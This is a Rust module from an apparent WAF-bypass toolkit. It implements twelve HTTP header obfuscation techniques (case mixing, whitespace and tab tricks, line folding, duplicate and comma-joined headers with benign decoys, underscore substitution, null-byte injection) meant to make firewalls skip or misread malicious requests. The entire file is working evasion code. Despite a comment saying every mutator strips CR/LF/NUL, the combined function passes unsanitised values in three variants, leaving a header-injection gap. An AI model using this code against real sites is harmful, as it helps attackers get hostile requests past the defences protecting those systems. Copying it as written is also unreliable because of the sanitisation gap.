//! HTTP header obfuscation for WAF bypass.
//!
//! WAFs inspect HTTP headers to detect malicious requests. This module
//! applies transformations that are valid per HTTP RFCs but confuse
//! WAF header parsers, causing them to misparse or skip inspection.
//!
//! # Techniques
//!
//! - **Case mixing** — `cOnTeNt-TyPe` instead of `Content-Type`
//! - **Whitespace tricks** — tabs, spaces around colons and values
//! - **Header folding** — obsolete but still parsed by many servers (RFC 7230 §3.2.4)
//! - **Duplicate headers** — first vs. last wins disagreement
//! - **Underscore substitution** — `Content_Type` accepted by some servers
//! - **Null byte injection** — `Content-Type\x00` truncates header name
//! - **`SPaced` header name** — `Content-Type ` trailing space before colon
//! - **Header value wrapping** — Value spread across multiple continuation lines
//! - **Comma-joined header values** — Multiple values in one header via comma

use std::fmt;

/// A header transformation technique.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, serde::Serialize, serde::Deserialize)]
#[non_exhaustive]
pub enum HeaderTechnique {
    /// Random case mixing of header name.
    CaseMixing,
    /// Tab character instead of space after colon.
    TabSeparator,
    /// Extra whitespace around header value.
    WhitespacePadding,
    /// Obsolete header folding with continuation line (CRLF + whitespace).
    LineFolding,
    /// LF-only continuation line.
    LfOnlyLineFolding,
    /// Duplicate header with benign value first.
    DuplicateHeader,
    /// Underscore instead of hyphen in header name.
    UnderscoreSubstitution,
    /// Null byte injected into header name.
    NullByteInjection,
    /// Trailing space before colon in header name.
    TrailingSpace,
    /// Header value wrapped across multiple continuation lines.
    MultiLineFolding,
    /// LF-only multi-line folding.
    LfOnlyMultiLineFolding,
    /// Multiple values comma-joined in a single header.
    CommaJoin,
}

impl fmt::Display for HeaderTechnique {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::CaseMixing => f.write_str("case-mixing"),
            Self::TabSeparator => f.write_str("tab-separator"),
            Self::WhitespacePadding => f.write_str("whitespace-padding"),
            Self::LineFolding => f.write_str("line-folding"),
            Self::LfOnlyLineFolding => f.write_str("lf-only-line-folding"),
            Self::DuplicateHeader => f.write_str("duplicate-header"),
            Self::UnderscoreSubstitution => f.write_str("underscore-substitution"),
            Self::NullByteInjection => f.write_str("null-byte-injection"),
            Self::TrailingSpace => f.write_str("trailing-space"),
            Self::MultiLineFolding => f.write_str("multi-line-folding"),
            Self::LfOnlyMultiLineFolding => f.write_str("lf-only-multi-line-folding"),
            Self::CommaJoin => f.write_str("comma-join"),
        }
    }
}

/// Apply case mixing to a header name.
///
/// Produces `cOnTeNt-TyPe` style output. HTTP header names are defined
/// as case-insensitive (RFC 7230 §3.2), so servers accept any casing,
/// but some WAFs only match canonical `Content-Type`.
#[must_use]
pub fn case_mix(header_name: &str) -> String {
    crate::encoding::keyword::alternating_case(header_name, false)
}

/// Strip CR (`\r`), LF (`\n`), and NUL (`\0`) from a header value so
/// the mutator output cannot smuggle a fake header line. Pre-fix every
/// public mutator embedded `value` verbatim — a caller passing a value
/// containing `\r\nEvil-Header: pwn` produced response splitting /
/// request smuggling on the wire. The transport layer assumed these
/// helpers had already sanitised; the helpers assumed the transport
/// layer would. Both wrong. Sanitising here closes the gap without an
/// API break.
fn sanitize_header_value(value: &str) -> String {
    value
        .chars()
        .filter(|c| *c != '\r' && *c != '\n' && *c != '\0')
        .collect()
}

/// Apply tab separator: `Header:\tvalue` instead of `Header: value`.
#[must_use]
pub fn tab_separator(header_name: &str, value: &str) -> String {
    let value = sanitize_header_value(value);
    format!("{header_name}:\t{value}")
}

/// FNV-1a hash of header_name + value bytes for deterministic pad count.
fn fnv1a_header_hash(header_name: &str, value: &str) -> u64 {
    let mut h: u64 = 0xcbf29ce484222325;
    for b in header_name.bytes().chain(value.bytes()) {
        h ^= u64::from(b);
        h = h.wrapping_mul(0x100000001b3);
    }
    h
}

/// Apply whitespace padding around the value.
///
/// The pad count (2-5 spaces) is derived deterministically from FNV-1a hash
/// of the header name and sanitised value, ensuring byte-identical output
/// for identical inputs across all runs.
#[must_use]
pub fn whitespace_pad(header_name: &str, value: &str) -> String {
    let value = sanitize_header_value(value);
    // derive 2-5 spaces deterministically from header name + value
    let pad_count = (fnv1a_header_hash(header_name, &value) as usize) % 4 + 2;
    let left = " ".repeat(pad_count);
    let right = " ".repeat(pad_count);
    format!("{header_name}:{left}{value}{right}")
}

fn char_boundary_near(s: &str, byte_idx: usize) -> usize {
    if byte_idx >= s.len() {
        return s.len();
    }
    let mut i = byte_idx;
    while i > 0 && !s.is_char_boundary(i) {
        i -= 1;
    }
    i
}

/// Apply obsolete line folding (RFC 7230 §3.2.4).
///
/// The header value is split across two lines with a continuation marker
/// (CRLF followed by a space or tab). This is obsolete but many servers
/// still accept it, while WAFs often do not reassemble folded headers.
#[must_use]
pub fn line_fold(header_name: &str, value: &str) -> String {
    line_fold_with_ending(header_name, value, "\r\n")
}

/// Apply LF-only line folding.
#[must_use]
pub fn lf_only_line_fold(header_name: &str, value: &str) -> String {
    line_fold_with_ending(header_name, value, "\n")
}

fn line_fold_with_ending(header_name: &str, value: &str, ending: &str) -> String {
    let value = sanitize_header_value(value);
    if value.len() < 4 {
        return format!("{header_name}: {value}");
    }
    let mid = char_boundary_near(&value, value.len() / 2);
    format!(
        "{}: {}{ending}\t{}",
        header_name,
        &value[..mid],
        &value[mid..]
    )
}

/// Apply multi-line folding — value spread across 3+ continuation lines.
///
/// More aggressive than single fold — splits value into thirds.
/// Many WAFs only handle one continuation line.
#[must_use]
pub fn multi_line_fold(header_name: &str, value: &str) -> String {
    multi_line_fold_with_ending(header_name, value, "\r\n")
}

/// Apply LF-only multi-line folding.
#[must_use]
pub fn lf_only_multi_line_fold(header_name: &str, value: &str) -> String {
    multi_line_fold_with_ending(header_name, value, "\n")
}

fn multi_line_fold_with_ending(header_name: &str, value: &str, ending: &str) -> String {
    let value = sanitize_header_value(value);
    if value.len() < 6 {
        return format!("{header_name}: {value}");
    }
    let t1 = char_boundary_near(&value, value.len() / 3);
    let t2 = char_boundary_near(&value, value.len() * 2 / 3);
    format!(
        "{}: {}{ending} {}{ending}\t{}",
        header_name,
        &value[..t1],
        &value[t1..t2],
        &value[t2..]
    )
}

/// Generate a duplicate header pair: returns `(benign_line, real_line)`.
///
/// Some WAFs only inspect the first occurrence of a header, while many
/// servers use the last. By placing a benign value first and the real
/// value second, the WAF sees the benign header, the server sees the
/// real one.
#[must_use]
pub fn duplicate_header(
    header_name: &str,
    real_value: &str,
    benign_value: &str,
) -> (String, String) {
    let real = sanitize_header_value(real_value);
    let benign = sanitize_header_value(benign_value);
    (
        format!("{header_name}: {benign}"),
        format!("{header_name}: {real}"),
    )
}

/// Replace hyphens with underscores in the header name.
///
/// Some web servers (notably PHP with `$_SERVER`, and CGI) normalise
/// `Content_Type` → `Content-Type`. WAFs typically do not.
#[must_use]
pub fn underscore_substitute(header_name: &str) -> String {
    header_name.replace('-', "_")
}

/// Inject a null byte into the header name at the midpoint.
///
/// Some C-based WAF implementations (modSecurity, native nginx modules)
/// use null-terminated string operations internally. A null byte in the
/// header name causes the WAF to see a truncated name (e.g., `Content`
/// instead of `Content-Type\x00`), while the upstream server may parse
/// the full name.
#[must_use]
pub fn null_byte_inject(header_name: &str) -> String {
    if header_name.len() < 2 {
        return header_name.to_string();
    }
    let mid = char_boundary_near(header_name, header_name.len() / 2);
    format!("{}\x00{}", &header_name[..mid], &header_name[mid..])
}

/// Add a trailing space before the colon separator.
///
/// `Content-Type : value` — some parsers strip the space, making this
/// equivalent. WAFs that expect `Name:` or `Name: ` without extra space
/// in the header name field may fail to match.
#[must_use]
pub fn trailing_space(header_name: &str, value: &str) -> String {
    let value = sanitize_header_value(value);
    format!("{header_name} : {value}")
}

/// Comma-join multiple values into a single header.
///
/// Per RFC 7230 §3.2.6, a recipient may combine multiple header fields
/// with the same name into one `field-value` separated by commas.
/// `Header: benign, malicious` is semantically equivalent to two
/// separate `Header: benign` and `Header: malicious` lines. WAFs that
/// split on the first comma may only inspect `benign`.
#[must_use]
pub fn comma_join(header_name: &str, real_value: &str, benign_value: &str) -> String {
    let real = sanitize_header_value(real_value);
    let benign = sanitize_header_value(benign_value);
    format!("{header_name}: {benign}, {real}")
}

/// Apply all header obfuscation techniques to a header name/value pair.
///
/// Returns a vector of `(technique, obfuscated_header_line)` pairs.
/// For `DuplicateHeader`, the two lines are joined with CRLF.
#[must_use]
pub fn all_obfuscations(header_name: &str, value: &str) -> Vec<(HeaderTechnique, String)> {
    let benign = "safe_value";
    vec![
        (
            HeaderTechnique::CaseMixing,
            format!("{}: {}", case_mix(header_name), value),
        ),
        (
            HeaderTechnique::TabSeparator,
            tab_separator(header_name, value),
        ),
        (
            HeaderTechnique::WhitespacePadding,
            whitespace_pad(header_name, value),
        ),
        (HeaderTechnique::LineFolding, line_fold(header_name, value)),
        (
            HeaderTechnique::LfOnlyLineFolding,
            lf_only_line_fold(header_name, value),
        ),
        (HeaderTechnique::DuplicateHeader, {
            let (a, b) = duplicate_header(header_name, value, benign);
            format!("{a}\r\n{b}")
        }),
        (
            HeaderTechnique::UnderscoreSubstitution,
            format!("{}: {}", underscore_substitute(header_name), value),
        ),
        (
            HeaderTechnique::NullByteInjection,
            format!("{}: {}", null_byte_inject(header_name), value),
        ),
        (
            HeaderTechnique::TrailingSpace,
            trailing_space(header_name, value),
        ),
        (
            HeaderTechnique::MultiLineFolding,
            multi_line_fold(header_name, value),
        ),
        (
            HeaderTechnique::LfOnlyMultiLineFolding,
            lf_only_multi_line_fold(header_name, value),
        ),
        (
            HeaderTechnique::CommaJoin,
            comma_join(header_name, value, benign),
        ),
    ]
}

#[cfg(test)]
#[path = "header_tests.rs"]
mod tests;
